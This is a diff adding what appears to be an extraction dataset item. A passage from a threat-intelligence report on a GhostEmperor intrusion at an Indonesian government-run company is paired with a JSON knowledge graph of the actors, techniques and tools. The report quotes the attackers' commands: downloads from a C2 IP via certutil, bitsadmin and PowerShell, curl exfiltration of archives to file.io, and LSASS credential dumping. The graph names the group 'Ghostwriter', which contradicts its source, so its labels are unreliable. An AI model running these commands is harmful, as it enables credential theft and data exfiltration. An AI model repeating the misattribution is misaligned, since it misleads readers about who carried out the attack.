@@ -1,0 +1,421 @@
+
+
+
+Sentence : Incident 2. Indonesia
+Victim summary
+Contents 24
+Threat
+GhostEmperor
+Industry
+Government
+Incident description
+Countries affected
+Indonesia
+In August of 2022, our analysts detected an attack against a government-run Indonesian company. The APT
+group known as GhostEmperor is suspected of being behind the attack.
+GhostEmperor is an APT group that has been tracked since 2021. It is engaged in cyberespionage in various
+sectors, including government and financial organizations, energy and technology companies.
+This APT group uses various attack methods, including phishing campaigns, software vulnerability exploits, and
+network traffic interception. This threat actor uses various tools and techniques to remain unnoticed, including
+fake domain names, encrypted communication channels, and multi-staged propagation of malicious programs.
+1
+Victims.
+GhostEmperor mainly targets government and corporate networks in Southeast Asia. However, their attacks may also extend to other
+regions.
+2
+Attack methods.
+This group uses various attack methods, including spear-phishing, malicious email attachments, and network vulnerability exploits. They
+also use remote access tools (RAT) and custom-developed malware to gain access to the victim's systems and control them.
+3
+Goals.
+GhostEmperor usually aims to steal data or conduct espionage.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Contents 25
+In this particular incident, we do not have access to any information on the initial vector of infection of the
+company. The detected events let us identify the actions of the threat actor on infected servers of the
+company starting from the middle of the Cyber Kill Chain. As usual with most Asian APT groups, the attackers
+maintain persistence in the system by using the technique known as Hijack Execution Flow: DLL Side-
+Loading T1574.002.
+Detailed description
+Ingress Tool Transfer T1105:
+The first step of the attacker on the victim's system is to download legitimate software named meupdate.exe
+(MD5: 0114B3BF0B53DEB5B9C300B2295DD71F) with a legitimate signature from Microsoft Corporation at the
+non-standard path "c:\windows\help\help\meupdate.exe".
+This software is delivered through the LOLBin utility named certutil.exe:
+cmd.exe /c certutil -urlcache -split -f http://8.210.141[.]104:8099/MEUpdate.exe
+С:\Windows\Help\Help\MEUpdate.exe"
+According to the Microsoft description, this software is an update component that is built into the Windows
+Edge browser. Standard name and path of the program: “C:\Program Files (x86)\Microsoft\EdgeUpdate\
+MicrosoftEdgeUpdate.exe"
+Figure 7 Trusted digital signature
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Hijack Execution Flow: DLL Side-Loading T1574.002:
+Contents 26
+A malicious library is also dropped into this directory—msedgeupdate.dll (MD5:
+6D72C024B804CF690C7E7E8A7135EDB0). After the process is started, the malicious library is loaded into its
+address space and establishes network connections with the following IP addresses:
+
+
+47.96.167[.]205
+
+
+8.210.141[.]104
+
+
+23.224.91[.]98
+
+
+Figure 8 Network connection information
+Establishing a TCP session with the C2 of the attackers
+The specified addresses are the attackers' command and control centers (C2) used to manage the malicious
+software. A large amount of malicious samples were downloaded from these IP addresses.
+Information from Kaspersky Threat Intelligence Portal.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia Contents 27
+Figure 9 Information about malware that contacted a malicious IP
+Process Injection: Process Hollowing T1055.012 + Masquerading T1036:
+Then the malicious DLL, which is executed in the address space of the legitimate process, performs the
+Process Injection technique: Process Hollowing T1055.012. The main mechanism of this technique is to
+create a process in the suspended state. This allows the attacker to inject malicious code into this process by
+replacing the executable file image in the address space. A detailed description of this technique is provided in
+the Technical details section. While employing the Process Hollowing technique, an attacker is often disguised
+as a legitimate process ( Masquerading T1036 ).
+In the described incident, the threat actor implemented Process Hollowing by creating the svchost.exe
+process. After the image was replaced and the malicious code was run in the context of svchost.exe, the main
+malicious activity began. This activity involved reconnaissance and information collection for its subsequent
+exfiltration.
+Create or Modify System Process: Windows Service T1543.003:
+The infected svchost.exe generates the child process cmd.exe, which registers and starts the service to
+elevate privileges from administrator to system privileges:
+sc.exe create "server power" binpath= "С:\Windows\system32\cmd.exe /c start
+С:\Windows\Help\help\MEUpdate.exe"
+sc.exe start "server power"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Contents 28
+A similar process chain is observed when the attacker conducts reconnaissance of the environment:
+svchost. exe › cmd.exe › process for reconnaissance. The threat actor uses a standard set of commands
+that allow them to collect basic information about the infected system.
+MITRE ATT&CK Commands
+matrix technique
+quser.exe whoami
+System Owner/User Discovery T1033
+quser.exe quser
+System Time Discovery T1124 net.exe time /do
+Process Discovery T1057 tasklist.exe /svc
+System Network Connections Discovery T1049 cmd.exe" /c netstat -ano"
+System Network Configuration Discovery T1016 ipconfig.exe /all
+cmd.exe /C systeminfo
+System Information Discovery T1082
+cmd.exe /C net view \HOST X
+File and Directory Discovery T1083 cmd.exe /c dir $appdata"
+Software Discovery: Security Software Discovery
+T1518.001
+cmd.exe /C dir "$programfiles\Kaspersky Lab\Kaspersky
+Endpoint Security for Windows\version.txt"
+cmd.exe /C type "$programfiles\Kaspersky Lab\Kaspersky
+Endpoint Security for Windows\version.txt"
+cmd.exe /C net group "domain admins" /domain"
+Permission Groups Discovery T1069
+cmd.exe /C net group /do
+System Network Configuration Discovery: Internet
+ping.exe -n 1 -a 10.1.2.98
+Connection Discovery T1016.001
+Group Policy Discovery T1615
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+cmd.exe /C type \\SYSVOL\\Policies\
+{C9289F9A-2AB9-*--****}\Machine\Preferences\
+ScheduledTasks\ScheduledTasks.xml"
+cmd.exe /C type \\sysvol\run.bat"
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Contents 29
+After gathering information on the environment, the attacker attempted to obtain the user credentials for
+lateral movement through the network.
+OS Credential Dumping: LSASS Memory T1003.001:
+To get the NT hashes of user account passwords, the attackers dumped the lsass.exe process memory:
+The choice of dumping tool is very interesting. It is part of the Microsoft Visual Studio suite and may reside on
+a machine in the legitimate directory "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\
+IDE\Extensions\TestPlatform\Extensions\DumpMinitool.exe". For some reason, the tool is very popular on
+Asian forums when discussing how to bypass security mechanisms for dumping lsass.exe [2] :
+Figure 10 Valid digital signature
+In the described incident, the attacker used the traditional method for implementing this tool:
+$windir\Help\Help\DumpMinitool.exe --file 1.txt --processId 748 --dumpType Full"
+cmd.exe /C DumpMinitool.exe --file 1.txt --processId 748 --dumpType Full"
+2
+aqtd wangan programmerall ctfiot tencent
+Learn more Learn more Learn more Learn more Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Additionally, the attacker simultaneously uses three tools with two different libraries:
+
+
+$windir\help\help\ssp.exe (MD5: AF893448B4D1862C42D6E1CC3AA8878D)
+
+
+$windir\help\help\duplicatedump.exe - (MF5: AD2C078AE847EDE5C66494F0DDECD35C)
+
+
+$windir\help\help\new.exe - (MD5: 018F65947686B4CEA313570AC74780BD)
+
+
+$windir\Help\Help\LSAPlugin.dll - (MD5: EC38F08AAAEADD833B0B356E2783FFD4)
+
+
+$windir\Help\Help\Dll7.dll - (MD5: 871CC8F514011F4796982D5E6E5F35C1)
+
+
+The tool was always delivered together with an archive and was run from open directories:
+Figure 11 Archive contents
+$windir\Help\Help\ssp.exe $windir\Help\Help\Dll7.dll
+$windir\help\help\duplicatedump.exe -f test -c $windir\Help\Help\LSAPlugin.dll
+$windir\Help\Help\new.exe С:\Windows\help\help\dll7.dll
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 30
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Figure 12
+Execution graph. TIP interface
+Contents 31
+The tool named ssp.exe (MD5: AF893448B4D1862C42D6E1CC3AA8878D) is a built variant of the publicly
+available mimikat_ssp tool [3], which is used to compromise and steal account credentials and secrets from lsass.
+exe. It is also used by various Asian APT groups.
+3
+mimikat_ssp
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Figure 13 Building mimikat_ssp
+Contents 32
+The second tool, DuplicateDump.exe, is also used to compromise and steal account credentials and secrets
+from lsass.exe. A special feature of this tool is the capability to duplicate the handle of the lsass.exe process.
+This way, the tool obtains a ready-to-use handle for the lsass.exe process without calling OpenProcess,
+thereby allowing it to bypass conventional detection of LSASS dump based on the Sysmon event [4] "Process
+Access" with an event ID 10. Just like in the first case, we detected the use of this tool by Asian APT groups.
+4
+DuplicateDump
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Figure 14 Tool description
+Unsecured Credentials: Group Policy Preferences T1552.006:
+Contents 33
+In addition to the lsass.exe process dump, the attacker attempted to find passwords in group policy files by
+using the findstr tool and the keyword «cpassword»:
+cmd.exe /C findstr /s /i "cpassword" \\sysvol*.xml"
+We detected that the threat actor used bitsadmin and PowerShell to download the file named 1.txt to the
+compromised system after stealing account credentials. Unfortunately, we were not able to obtain this file
+during our incident investigation. The purpose of this download remains unclear. Nonetheless, any use of tools
+to download files from suspicious external IP addresses within a domain is definitely a suspicious event.
+BITS Jobs T1197 + Ingress Tool Transfer T1105:
+cmd.exe /c bitsadmin /transfer n http://8.210.141[.]104:8099/1.txt $public\Downloads\1.txt
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+PowerShell T1059.001 + Ingress Tool Transfer T1105:
+Contents 34
+сmd.exe /c PowerShell iwr -Uri http://8.210.141[.]104:8099/1.txt -OutFile c:\1.txt -UseBasicParsing
+Relevant information is gathered by using archives that are stored in the same directory as before: "$windir\
+Help\Help".
+Archive Collected Data: Archive via Utility:
+$windir\Help\Help\7z.exe a $windir\Help\Help\tg.7z $windir\Help\Help\1.rar
+The archives are exfiltrated to a legitimate cloud storage using the curl utility.
+Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002:
+curl.exe -F "file=@$windir\help\help\1.rar" --ssl-no-revoke https[:]//file.io
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  | Incident 2. Indonesia
+Summary
+Contents 35
+The attackers employ the favored technique of Asian APT groups for persistance in the infrastructure —
+Hijack Execution Flow: DLL Side-Loading T1574.002. The attack also employs tools that are predominately
+popular on Asian forums for obtaining user credentials. The most likely goals of the attackers are
+cyberespionage and data exfiltration. Data is collected into individual archives and exfiltrated using legitimate
+services, such as popular cloud storage services.
+Download techniques in JSON format for MITRE Navigator:
+Learn more
+Figure 15
+Threat Landscape page interface in TIP
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 36
+Incidents involving Asian APT groups in various regions of the planet
+Output : 
+{
+  "nodes": [
+    {
+      "id": "Ghostwriter",
+      "label": "Ghostwriter",
+      "type": "APT Group"
+    },
+    {
+      "id": "Indonesia",
+      "label": "Indonesia",
+      "type": "Target Country"
+    },
+    {
+      "id": "Government Networks",
+      "label": "Government Networks",
+      "type": "Target Infrastructure"
+    },
+    {
+      "id": "Hijack Execution Flow: DLL Side-Loading T1574.002",
+      "label": "Hijack Execution Flow: DLL Side-Loading T1574.002",
+      "type": "Tactic/Technique"
+    },
+    {
+      "id": "LSASS Memory Dumping T1003.001",
+      "label": "LSASS Memory Dumping T1003.001",
+      "type": "Tactic/Technique"
+    },
+    {
+      "id": "BITS Jobs T1197",
+      "label": "BITS Jobs T1197",
+      "type": "Tactic/Technique"
+    },
+    {
+      "id": "Ingress Tool Transfer T1105",
+      "label": "Ingress Tool Transfer T1105",
+      "type": "Tactic/Technique"
+    },
+    {
+      "id": "PowerShell T1059.001",
+      "label": "PowerShell T1059.001",
+      "type": "Tactic/Technique"
+    },
+    {
+      "id": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002",
+      "label": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002",
+      "type": "Tactic/Technique"
+    },
+    {
+      "id": "mechanism_dumpMinitool",
+      "label": "DumpMinitool.exe",
+      "type": "Tool"
+    },
+    {
+      "id": "mimikat_ssp",
+      "label": "ssp.exe (mimikat_ssp)",
+      "type": "Tool"
+    },
+    {
+      "id": "DuplicateDump",
+      "label": "duplicatedump.exe",
+      "type": "Tool"
+    },
+    {
+      "id": "new_exe",
+      "label": "new.exe",
+      "type": "Tool"
+    },
+    {
+      "id": "LSAPlugin_dll",
+      "label": "LSAPlugin.dll",
+      "type": "Library"
+    },
+    {
+      "id": "Dll7_dll",
+      "label": "Dll7.dll",
+      "type": "Library"
+    },
+    {
+      "id": "7z_exe",
+      "label": "7z.exe",
+      "type": "Tool"
+    },
+    {
+      "id": "curl_exe",
+      "label": "curl.exe",
+      "type": "Tool"
+    },
+    {
+      "id": "file_io",
+      "label": "https://file.io",
+      "type": "Cloud Storage"
+    }
+  ],
+  "edges": [
+    {
+      "from": "Ghostwriter",
+      "to": "Indonesia",
+      "label": "Targeted"
+    },
+    {
+      "from": "Ghostwriter",
+      "to": "Government Networks",
+      "label": "Targeted"
+    },
+    {
+      "from": "Ghostwriter",
+      "to": "Hijack Execution Flow: DLL Side-Loading T1574.002",
+      "label": "Used"
+    },
+    {
+      "from": "Ghostwriter",
+      "to": "LSASS Memory Dumping T1003.001",
+      "label": "Used"
+    },
+    {
+      "from": "Ghostwriter",
+      "to": "BITS Jobs T1197",
+      "label": "Used"
+    },
+    {
+      "from": "Ghostwriter",
+      "to": "Ingress Tool Transfer T1105",
+      "label": "Used"
+    },
+    {
+      "from": "Ghostwriter",
+      "to": "PowerShell T1059.001",
+      "label": "Used"
+    },
+    {
+      "from": "Ghostwriter",
+      "to": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002",
+      "label": "Used"
+    },
+    {
+      "from": "LSASS Memory Dumping T1003.001",
+      "to": "mechanism_dumpMinitool",
+      "label": "Tool Used"
+    },
+    {
+      "from": "LSASS Memory Dumping T1003.001",
+      "to": "mimikat_ssp",
+      "label": "Tool Used"
+    },
+    {
+      "from": "LSASS Memory Dumping T1003.001",
+      "to": "DuplicateDump",
+      "label": "Tool Used"
+    },
+    {
+      "from": "LSASS Memory Dumping T1003.001",
+      "to": "new_exe",
+      "label": "Tool Used"
+    },
+    {
+      "from": "LSASS Memory Dumping T1003.001",
+      "to": "LSAPlugin_dll",
+      "label": "Library Used"
+    },
+    {
+      "from": "LSASS Memory Dumping T1003.001",
+      "to": "Dll7_dll",
+      "label": "Library Used"
+    },
+    {
+      "from": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002",
+      "to": "7z_exe",
+      "label": "Tool Used"
+    },
+    {
+      "from": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002",
+      "to": "curl_exe",
+      "label": "Tool Used"
+    },
+    {
+      "from": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002",
+      "to": "file_io",
+      "label": "Cloud Storage Used"
+    }
+  ]
+}
